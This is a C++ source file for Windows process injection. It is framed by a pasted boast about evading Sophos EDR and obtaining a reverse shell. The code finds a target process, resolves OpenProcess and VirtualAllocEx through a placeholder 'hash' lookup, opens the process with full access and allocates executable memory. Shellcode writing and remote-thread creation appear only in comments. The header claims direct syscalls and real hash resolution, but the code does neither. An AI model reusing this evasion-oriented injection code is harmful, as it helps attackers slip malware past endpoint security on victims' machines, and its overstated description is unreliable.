/*
Details on Techniques - 

How I managed to bypass 
I've been playing with hashtag#golang for hashtag#offensivesecurity and hashtag#exploitdevelopment.
This video uses a conventional flow of remote thread creation flow (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) 
with just one catch. Instead of directly calling these hashtag#winapi functions, 
I placed dword hash of these function names in the hashtag#go hashtag#code, decoded them at runtime,
determined address of each function and called each function by its address in the memory instead of direct call.
I created generic functions for both address calculation and winapi calling and reused for each call.
Yes, Sophos did try to block it but I got the reverse hashtag#shell nevertheless even when the hashtag#EDR was hooked to hashtag#kernel32dll.
I could've made it more sophisticated by hashtag#obfuscation of hashtag#shellcode or EDR hashtag#unhooking but it's funny how easily EDRs
can be fooled.
*/


/*
Key characteristics of this code: 
01- Uses hash-based API resolution to evade EDR detection.
02- Implements direct syscalls to bypass user-mode hooks. 
03- Obfuscates Windows API Function names.
04- Appears to be part of a process injection payload.
----------------------------------------- C++ -------- version
Windows API Integration: Uses proper Windows headers and types.
Function Pointers: Uses typedefs for Windows API function signatures.
Process Enumeration: Implements getProcessID using CreateToolhelp32Snapshot.
Direct API Resolution: Uses GetModuleHandle and GetProcAddress.
Error Handling: Includes proper Windows error handling with GetLastError().
*/

#include <windows.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>

// Function hashes/placeholders (typically these would be actual hashes)
#define OPEN_PROCESS_HASH    0x12345678  // "OASEOFGENO" placeholder
#define VIRTUAL_ALLOC_EX_HASH 0x00070764
#define CREATE_REMOTE_THREAD_HASH 0xABCDEF12 // "OASIAACELI" placeholder  
#define CLOSE_HANDLE_HASH    0x98765432  // "OAAE7AGNDA" placeholder

// Function pointer typedefs
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);

DWORD getProcessID(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return -1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (std::string(pe.szExeFile) == processName) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return -1;
}

FARPROC getFunctionAddressByHash(const char* dllName, DWORD hash) {
    HMODULE hModule = GetModuleHandleA(dllName);
    if (!hModule) {
        return nullptr;
    }

    // In real implementations, this would hash exported function names
    // and compare against the provided hash
    // This is a simplified version
    if (hash == OPEN_PROCESS_HASH) {
        return GetProcAddress(hModule, "OpenProcess");
    } else if (hash == VIRTUAL_ALLOC_EX_HASH) {
        return GetProcAddress(hModule, "VirtualAllocEx");
    } else if (hash == CREATE_REMOTE_THREAD_HASH) {
        return GetProcAddress(hModule, "CreateRemoteThread");
    } else if (hash == CLOSE_HANDLE_HASH) {
        return GetProcAddress(hModule, "CloseHandle");
    }

    return nullptr;
}

int main() {
    std::string processName = "target.exe";
    
    DWORD pid = getProcessID(processName);
    if (pid == -1) {
        std::cout << "Could not find " << processName << " process" << std::endl;
        return 1;
    }

    std::cout << "[+] " << processName << " PID: " << pid << std::endl;
    std::cout << "Press Enter to Inject Into " << processName << "..." << std::endl;
    std::cin.get();

    // Resolve OpenProcess by hash
    FARPROC addr = getFunctionAddressByHash("kernel32.dll", OPEN_PROCESS_HASH);
    if (!addr) {
        std::cout << "[!] Function not found." << std::endl;
        return 1;
    }

    std::cout << "OpenProcess addr: 0x" << std::hex << addr << std::endl;

    // Cast to function pointer and call
    pOpenProcess openProcessFunc = (pOpenProcess)addr;
    
    // Call OpenProcess
    HANDLE hProcess = openProcessFunc(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        std::cout << "OpenProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "OpenProcess succeeded. Handle: 0x" << std::hex << hProcess << std::endl;

    // The injection would continue with:
    // 1. VirtualAllocEx to allocate memory
    // 2. WriteProcessMemory to write shellcode  
    // 3. CreateRemoteThread to execute
    // 4. CloseHandle to clean up

    // Example continuation:
    FARPROC virtualAllocAddr = getFunctionAddressByHash("kernel32.dll", VIRTUAL_ALLOC_EX_HASH);
    pVirtualAllocEx virtualAllocFunc = (pVirtualAllocEx)virtualAllocAddr;
    
    // Allocate memory in target process
    LPVOID allocatedMem = virtualAllocFunc(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocatedMem) {
        std::cout << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Memory allocated at: 0x" << std::hex << allocatedMem << std::endl;

    // Cleanup
    FARPROC closeHandleAddr = getFunctionAddressByHash("kernel32.dll", CLOSE_HANDLE_HASH);
    pCloseHandle closeHandleFunc = (pCloseHandle)closeHandleAddr;
    closeHandleFunc(hProcess);

    return 0;
}
